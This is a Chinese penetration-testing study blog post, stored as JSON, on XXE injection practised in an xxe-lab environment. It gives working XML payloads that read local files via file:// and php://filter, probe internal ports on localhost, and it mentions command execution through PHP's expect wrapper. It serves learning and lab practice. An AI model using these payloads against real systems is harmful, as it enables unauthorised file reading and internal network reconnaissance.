{"title":"渗透测试笔记 - day22 XXE实体注入","date":"2023-03-16T17:42:18.114Z","date_formatted":{"ll":"Mar 16, 2023","L":"03/16/2023","MM-DD":"03-16"},"link":"2023/03/16/渗透测试笔记 - day22 XXE实体注入","updated":"2023-03-17T04:59:06.590Z","content":"<h2 id=\"xml基础\">XML基础<a title=\"#xml基础\" href=\"#xml基础\"></a></h2>\n<p>XML文档结构包括三部分：XML声明、DTD文档类型定义、文档元素。</p>\n<p>声明：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encodin=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>DTD文档类型定义：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">user</span> [</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ELEMENT <span class=\"keyword\">note</span> (<span class=\"keyword\">username</span>,<span class=\"keyword\">password</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ELEMENT <span class=\"keyword\">username</span> (<span class=\"keyword\">#PCDATA</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ELEMENT <span class=\"keyword\">password</span> (<span class=\"keyword\">#PCDATA</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ENTITY <span class=\"keyword\">admin</span> <span class=\"string\">&quot;hello xml!&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"xml-dtd\">XML-DTD<a title=\"#xml-dtd\" href=\"#xml-dtd\"></a></h2>\n<p>ELEMENT标签用来定义元素。</p>\n<p>ENTITY用来定义实例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE user [</span><br><span class=\"line\">    &lt;!ELEMENT note (username,password)&gt;</span><br><span class=\"line\">    &lt;!ELEMENT username (#PCDATA)&gt;</span><br><span class=\"line\">    &lt;!ELEMENT password (#PCDATA)&gt;</span><br><span class=\"line\">    &lt;!ENTITY admin STSTEM &quot;file:///d:/1.txt&quot;&gt;</span><br><span class=\"line\">    ]&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"xml注入漏洞-xxe\">XML注入漏洞-XXE<a title=\"#xml注入漏洞-xxe\" href=\"#xml注入漏洞-xxe\"></a></h2>\n<p><strong>实验环境</strong>：xxe-lab</p>\n<p>随便填写并抓包：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959007.png\" alt=\"image-20220228193345233\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959185.png\" alt=\"image-20220228193322754\" loading=\"lazy\" class=\"φbp\"></p>\n<p>发现xml在包内传输，构造xxe注入：</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE user [</span><br><span class=\"line\">&lt;!ELEMENT user (username.password)&gt;</span><br><span class=\"line\">&lt;!ELEMENT username (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT password (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ENTITY admin &quot;HELLO World&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959518.png\" alt=\"image-20220228193146184\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959834.png\" alt=\"image-20220228193235357\" loading=\"lazy\" class=\"φbp\"></p>\n<p>利用成功。</p>\n<h2 id=\"xxe任意文件读取：\">xxe任意文件读取：<a title=\"#xxe任意文件读取：\" href=\"#xxe任意文件读取：\"></a></h2>\n<h3 id=\"使用file协议\">使用file协议<a title=\"#使用file协议\" href=\"#使用file协议\"></a></h3>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE user [</span><br><span class=\"line\">&lt;!ELEMENT user (username.password)&gt;</span><br><span class=\"line\">&lt;!ELEMENT username (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT password (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ENTITY admin SYSTEM &quot;file:///C:/123.txt&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959762.png\" alt=\"image-20220228193811136\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"使用php伪协议\">使用PHP伪协议<a title=\"#使用php伪协议\" href=\"#使用php伪协议\"></a></h3>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE user [</span><br><span class=\"line\">&lt;!ELEMENT user (username.password)&gt;</span><br><span class=\"line\">&lt;!ELEMENT username (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT password (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ENTITY admin SYSTEM &quot;php://filter/read=convert.base64-encode/resource=C:/123.txt&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959126.png\" alt=\"image-20220228202139621\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"使用xxe进行内网探测\">使用xxe进行内网探测<a title=\"#使用xxe进行内网探测\" href=\"#使用xxe进行内网探测\"></a></h2>\n<p>原理：访问目标开放端口时会快速解析完成或者报错。当端口未开放时，访问目标端口会长时间无回显。</p>\n<p><strong>探测80端口</strong>  payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE user [</span><br><span class=\"line\">&lt;!ELEMENT user (username.password)&gt;</span><br><span class=\"line\">&lt;!ELEMENT username (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT password (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ENTITY admin SYSTEM &quot;http://127.0.0.1:80&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959135.png\" alt=\"image-20220228194352612\" loading=\"lazy\" class=\"φbp\"></p>\n<p><strong>探测1234端口</strong> payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE user [</span><br><span class=\"line\">&lt;!ELEMENT user (username.password)&gt;</span><br><span class=\"line\">&lt;!ELEMENT username (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT password (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ENTITY admin SYSTEM &quot;http://localhost:1234&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959455.png\" alt=\"image-20220228194759340\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"xxe内网攻击\">XXE内网攻击<a title=\"#xxe内网攻击\" href=\"#xxe内网攻击\"></a></h2>\n<p>可通过http协议访问内网位置，造成任意命令执行漏洞。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959689.png\" alt=\"image-20220228210515269\" loading=\"lazy\" class=\"φbp\"></p>\n<p>如ThinkPHP任意文件读取漏洞、jboss等。</p>\n<h2 id=\"xxe命令执行漏洞\">XXE命令执行漏洞<a title=\"#xxe命令执行漏洞\" href=\"#xxe命令执行漏洞\"></a></h2>\n<p>当PHP环境下开启except伪协议后，可使用该伪协议执行系统命令。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959222.png\" alt=\"image-20220228201404782\" loading=\"lazy\" class=\"φbp\"></p>\n","prev":{"title":"渗透测试笔记 - day23 盲XXE","link":"2023/03/16/渗透测试笔记 - day23 盲XXE"},"next":{"title":"渗透测试笔记 - day20 XSS实战","link":"2023/03/16/渗透测试笔记 - day20 XSS实战"},"plink":"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day22 XXE实体注入/","toc":[{"id":"xml基础","title":"XML基础","index":"1"},{"id":"xml-dtd","title":"XML-DTD","index":"2"},{"id":"xml注入漏洞-xxe","title":"XML注入漏洞-XXE","index":"3"},{"id":"xxe任意文件读取：","title":"xxe任意文件读取：","index":"4","children":[{"id":"使用file协议","title":"使用file协议","index":"4.1"},{"id":"使用php伪协议","title":"使用PHP伪协议","index":"4.2"}]},{"id":"使用xxe进行内网探测","title":"使用xxe进行内网探测","index":"5"},{"id":"xxe内网攻击","title":"XXE内网攻击","index":"6"},{"id":"xxe命令执行漏洞","title":"XXE命令执行漏洞","index":"7"}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"March 16, 2023","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day22 XXE实体注入/\" title=\"渗透测试笔记 - day22 XXE实体注入\">https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day22 XXE实体注入/</a>"},"reading_time":"625 words in 4 min"}